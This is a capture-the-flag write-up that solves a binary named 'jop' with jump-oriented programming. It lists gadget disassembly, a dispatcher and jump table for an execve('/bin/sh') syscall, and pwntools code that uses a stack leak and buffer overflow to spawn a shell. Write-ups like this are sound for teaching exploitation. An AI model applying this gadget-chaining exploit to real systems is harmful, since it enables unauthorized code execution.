# jop

## Solution

To solve this challenge, I utilize jump-oriented programming. Because the binary contains a `syscall` instruction, we will attempt to execute an `execve` syscall. In order to use this strategy, I need a dispatch method, which will dispatch the calls to `jmp`. A good candidate for this is seen here:
```
0040119d  4883c408           add     rsp, 0x8
004011a1  4d31c9             xor     r9, r9
004011a4  4983c108           add     r9, 0x8
004011a8  4901e1             add     r9, rsp
004011ab  41ff21             jmp     qword [r9]
```
Upon inspection of this code segment, `rsp` will be used as running variable that will keep track of where in the jump table we are.

We will also need some way to initially get to the dispatch. Luckily, there is a convenient gadget available that does this job well:
```
004011b5  5c                 pop     rsp
004011b6  48c7c29d114000     mov     rdx, data_40119d
004011bd  ffe2               jmp     rdx  {data_40119d}
```
Now, we can start searching for useful gadgets that will populate our jump table. We note that we would like to set `rax` to `59`, `rdi` to point to `/bin/sh`, `rsi` to be zero, and `rdx` to be zero. We will next analyze a series of useful gadgets.
```
004011cd  48c7c03b000000     mov     rax, 59
004011d4  ffe2               jmp     rdx
```
This gadget will set `rax` to `59`, and assumes that `rdx` points to dispatch (which it should after the previous code segment).
```
004011dd  4889ef             mov     rdi, rbp {var_8}
004011e0  ffe2               jmp     rdx
```
This gadget will have `rdi` have the same value of `rbp`. So, if `rbp` points to `/bin/sh`, we will accomplish what we need to.
```
00401201  48c7c600000000     mov     rsi, 0x0
00401208  ffe2               jmp     rdx
```
This will set `rsi` to zero, which is what we want.
```
004011f5  4831d2             xor     rdx, rdx  {0x0}
004011f8  ffe1               jmp     rcx
```
This will set `rdx` to zero. The only issue is that it will jump to `rcx`. Therefore, we need to get the address of dispatch into rcx.
```
004011e9  4889d1             mov     rcx, rdx
004011ec  ffe2               jmp     rdx
```
This is the final piece we need, so we can now start to develop our exploit. We first save all of the addresses to these gadgets:
```python
# Getting elements of jump table
setup_dispatch = 0x4011b5 # pop rsp; mov rdx, dispatch; jmp rdx
set_rax =        0x4011cd # mov rax, 59; jmp rdx
set_rdi =        0x4011dd # mov rdi, rbp; jmp rdx
set_rsi =        0x401201 # mov rsi, 0; jmp rdx
set_rcx =        0x4011e9 # mov rcx, rdx; jmp rdx
set_rdx =        0x4011f5 # xor rdx, rdx; jmp rcx
syscall =        0x401211 # syscall
```
Next, we have to assemble the jump table:
```python
# Creating jump table
jmp_tbl = p64(set_rax)
jmp_tbl += p64(set_rdi)
jmp_tbl += p64(set_rsi)
jmp_tbl += p64(set_rcx)
jmp_tbl += p64(set_rdx)
jmp_tbl += p64(syscall)
```
We next note that, in order to have our jump table be pointed to by `rsp`, we have to add the pointer to the stack onto the stack. Luckily, the binary leaks the stack. So we use our script to get the leaked address of the stack:
```python
# Starting to remote and getting the address of the stack
p = start()
p.recvuntil(b'Stack: 0x')
stack = int(p.recv(12), 16) - 108
log.info(f"Stack identified at {hex(stack)}")
```
Finally, we put `/bin/bash` on the stack (so that `rbp` will point to that). Next, we can add our jump table to the stack. Then, we set up a buffer overflow. We set `rbp` to point to the top of the stack. Then, we set the return address to be our gadget to set up for dispatching. Finally, we add the address of the top of the stack to be popped into rsp. Thus, we send this chain at the binary to get the flag:
```python
# Construct the payload
chain = b'/bin/sh\0'
chain += p64(0)
chain += jmp_tbl
chain += cyclic(48)
chain += p64(stack)
chain += p64(setup_dispatch)
chain += p64(stack)
```